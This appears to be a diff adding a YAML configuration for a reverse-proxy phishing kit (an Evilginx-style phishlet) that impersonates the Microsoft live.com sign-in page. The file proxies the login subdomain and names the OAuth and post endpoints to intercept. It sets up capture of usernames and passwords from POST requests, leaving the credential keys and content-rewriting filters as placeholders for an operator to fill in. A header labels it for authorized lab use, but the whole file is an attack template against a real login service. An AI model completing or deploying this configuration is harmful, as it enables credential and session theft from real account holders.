@@ -1,0 +1,38 @@
+# AUTHORIZED LAB USE ONLY
+# Capture coverage: incomplete
+# Operator must complete credential searches and substitution filters, then lab-test.
+author: "lab-operator"
+min_ver: "2.3.0"
+proxy_hosts:
+  - phish_sub: "login"
+    orig_sub: "login"
+    domain: "live.com"
+    session: false
+    is_landing: true
+    auto_filter: true
+auth_tokens: []
+auth_urls:
+  - "/oauth20_authorize.srf"
+  - "/ppsecure/post.srf"
+login:
+  domain: "live.com"
+  path: "/ppsecure/post.srf"
+credentials:
+  username:
+    key: "{{PLACEHOLDER}}"
+    search: "{{PLACEHOLDER}}"
+    type: "post"
+  password:
+    key: "{{PLACEHOLDER}}"
+    search: "{{PLACEHOLDER}}"
+    type: "post"
+sub_filters:
+  - triggers_on: "{{PLACEHOLDER}}"
+    orig_sub: "{{PLACEHOLDER}}"
+    domain: "{{PLACEHOLDER}}"
+    search: "{{PLACEHOLDER}}"
+    replace: "{{PLACEHOLDER}}"
+    mimes:
+      - "text/html"
+      - "application/json"
+      - "application/javascript"
